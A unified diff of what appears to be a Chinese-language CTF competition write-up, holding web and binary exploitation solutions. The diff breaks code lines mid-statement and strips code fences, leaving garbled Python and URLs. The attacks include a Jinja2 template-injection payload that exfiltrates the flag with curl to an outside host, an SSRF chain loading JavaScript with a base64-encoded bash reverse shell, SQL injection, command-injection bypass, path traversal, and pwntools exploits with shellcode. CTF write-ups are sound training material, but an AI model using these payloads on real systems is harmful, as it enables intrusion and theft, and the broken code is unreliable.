@@ -37,7 +37,8 @@ break
 
 payload 禁用了print函数，使用如下payload进行无回显攻击，本地开启端口，如果拼接函数popen和命令curl
 
-name={%set x=cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:8081/`sort /fl*`').read()%}
+name={%set x=cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:
+8081/`sort /fl*`').read()%}
 
 无回显攻击
 
@@ -68,12 +69,13 @@ def index():
                 return "Oh,False!"
       
 
-            html = '''<html><head><title>^_^</title></head><body><div><h1>Hello: %s</h1></div></body></html>''' % name
+            html = '''<html><head><title>^_^</title></head><h1>Hello: %s</h1></html>''' % name
             return render_template_string(html)
-        except ValueError:
+        
+except ValueError:
             pass
     else:
-        html = '''<html><head><title>^_^</title></head><body><div><h1>Change.</h1></div></body></html>'''
+        html = '''<html><head><title>^_^</title></head><h1>Change.</h1></html>'''
         return render_template_string(html)
 
 python-2
@@ -223,7 +225,9 @@ ssrf 绕过本地限制即可
 
 读取远程恶意js文件
 
-http://192.44.1.112:8080/geturl?url=http://127.0.0.1:8080/cmd?test=http://10.101.64.12/poc.js
+http://192.44.1.112:
+8080/geturl?url=http://127.0.0.1:
+8080/cmd?test=http://10.101.64.12/poc.js
 
 var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwMS42NC4xMi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}");}
 
@@ -281,12 +285,8 @@ Twitter：@wgpsec
 
 
 ```
-name={%set x=cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:8081/`sort /fl*`').read()%}
-```
-
-
-
-```
+name={%set x=cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:
+8081/`sort /fl*`').read()%}
 # -*- coding: UTF-8 -*-
 
 from flask import Flask, request,render_template,render_template_string
@@ -310,24 +310,15 @@ def index():
                 return "Oh,False!"
       
 
-            html = '''<html><head><title>^_^</title></head><body><div><h1>Hello: %s</h1></div></body></html>''' % name
+            html = '''<html><head><title>^_^</title></head><h1>Hello: %s</h1></html>''' % name
             return render_template_string(html)
-        except ValueError:
+        
+except ValueError:
             pass
     else:
-        html = '''<html><head><title>^_^</title></head><body><div><h1>Change.</h1></div></body></html>'''
+        html = '''<html><head><title>^_^</title></head><h1>Change.</h1></html>'''
         return render_template_string(html)
-```
-
-
-
-```
 http://192.64.1.3/adminuser.php?action=searchmodify&id=-1' Union seLEct NULL,CONCAT(0x1,iFNULL(CAST(`name` AS CHAR),0x20),0x1),NULL,NULL FROM cf.flag-- -
-```
-
-
-
-```
 import requests
 import time
 strings = "dqazwsxedcrfvtgb1234567890yhnujmikolpphp."
@@ -341,13 +332,8 @@ for i in strings:
         tmp += i
         print(tmp)
         time.sleep(1)
-```
-
-
-
-```
 <?php
-#flag in /flag.txt
+    #flag in /flag.txt
 highlight_file(__FILE__);
 error_reporting(0);
 $content=$_GET['cmd'];
@@ -375,19 +361,9 @@ else
 {
     system($cmd);
 }
-```
-
-
-
-```
 http://192.64.1.149/d88554c739859dfe.php?cmd=sort%09/f*
-```
-
-
-
-```
 <?php
-#flag in /flag.txt
+    #flag in /flag.txt
 highlight_file(__FILE__);
 error_reporting(0);
 $content=$_GET['cmd'];
@@ -415,31 +391,13 @@ else
 {
     system($cmd);
 }
-```
-
-
-
-```
 /var/www/html/admin/inclues/set_page.php
-```
-
-
-
-```
 http://192.64.1.106/admin/admin.php?act=set_footer&file=../../../../../../../flag.txt
-```
-
-
-
-```
-http://192.44.1.112:8080/geturl?url=http://127.0.0.1:8080/cmd?test=http://10.101.64.12/poc.js
+http://192.44.1.112:
+8080/geturl?url=http://127.0.0.1:
+8080/cmd?test=http://10.101.64.12/poc.js
 
 var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwMS42NC4xMi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}");}
-```
-
-
-
-```
 from pwn import *
 import sys
 s       = lambda data               :io.send(data)
@@ -450,10 +408,14 @@ r       = lambda num                :io.recv(num)
 ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
 rl      = lambda                    :io.recvline()
 itr     = lambda                    :io.interactive()
-uu32    = lambda data               :u32(data.ljust(4,b'x00'))
-uu64    = lambda data               :u64(data.ljust(8,b'x00'))
-ls      = lambda data               :log.success(data)
-lss     = lambda s                  :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
+uu32    = lambda data               :
+u32(data.ljust(4,b'x00'))
+uu64    = lambda data               :
+u64(data.ljust(8,b'x00'))
+ls      = lambda data               :
+log.success(data)
+lss     = lambda s                  :
+log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
 
 context.arch      = 'amd64'
 context.log_level = 'debug'
@@ -481,7 +443,7 @@ if (libelf!=''): libc = ELF(libelf)
 gdbscript = '''
 brva 0x0014B7
 brva 0x0014D7
-#continue
+    #continue
 '''.format(**locals())
 
 io = start(binary)
@@ -492,7 +454,7 @@ def sett(name):
     ru('->set name')
     s(name)
 
-#gdb.attach(io,gdbscript)
+    #gdb.attach(io,gdbscript)
 pay = f'%{6+0xb}$p%{6+0xc}$p'
 sett(pay)
 
@@ -505,7 +467,7 @@ lss('can')
 st = int(r(len('0x7ffc4963dec0')),16)
 lss('st')
 ret = st - 0x60
-#pay = asm(shellcraft.read(0,ret,0x400)).ljust(72,b'x90')
+    #pay = asm(shellcraft.read(0,ret,0x400)).ljust(72,b'x90')
 pay  = asm(shellcraft.openat(-100, 'flag',0))
 pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
 pay  = pay.ljust(72,b'A')
@@ -513,25 +475,20 @@ pay += p64(can) * 2
 pay += p64(ret)
 sett(pay)
 
-#ru('2: get namen')
-#sl('2')
+    #ru('2: get namen')
+    #sl('2')
 
 ru('2: get namen')
 sl('3')
 
-#pause()
-#pay = b'x90' * 0x20
-#pay += asm(shellcraft.openat(-1, 'flag'))
-#pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
+    #pause()
+    #pay = b'x90' * 0x20
+    #pay += asm(shellcraft.openat(-1, 'flag'))
+    #pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
 #
-#sl(pay)
+    #sl(pay)
 
 itr()
-```
-
-
-
-```
 from pwn import *
 import sys
 s       = lambda data               :io.send(data)
@@ -542,10 +499,14 @@ r       = lambda num                :io.recv(num)
 ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
 rl      = lambda                    :io.recvline()
 itr     = lambda                    :io.interactive()
-uu32    = lambda data               :u32(data.ljust(4,b'x00'))
-uu64    = lambda data               :u64(data.ljust(8,b'x00'))
-ls      = lambda data               :log.success(data)
-lss     = lambda s                  :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
+uu32    = lambda data               :
+u32(data.ljust(4,b'x00'))
+uu64    = lambda data               :
+u64(data.ljust(8,b'x00'))
+ls      = lambda data               :
+log.success(data)
+lss     = lambda s                  :
+log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
 
 context.arch      = 'amd64'
 context.log_level = 'debug'
@@ -573,7 +534,7 @@ if (libelf!=''): libc = ELF(libelf)
 gdbscript = '''
 b *0x401E03
 b *0x402150
-#continue
+    #continue
 '''.format(**locals())
 
 io = start(binary)
@@ -594,7 +555,7 @@ def edit_flag(idx,data):
     #pause()
     sl(str(data))
 
-#gdb.attach(io,gdbscript)
+    #gdb.attach(io,gdbscript)
 add_flag()
 
 ru('6: check flagn')
@@ -616,9 +577,9 @@ ru('6: check flagn')
 sl('5')
 sl(str(flag))
 
-#edit_flag(0x4e6018+184, 0x401E03)
-#edit_flag(0x4e6018, 0x401E03)
-#while(1):
+    #edit_flag(0x4e6018+184, 0x401E03)
+    #edit_flag(0x4e6018, 0x401E03)
+    #while(1):
 #    d = io.recv(200)
 #    if b'flag{' in d:
 #        print(d)
@@ -626,7 +587,7 @@ sl(str(flag))
 #
 #
 
-#io.close()
+    #io.close()
 itr()
 ```
 
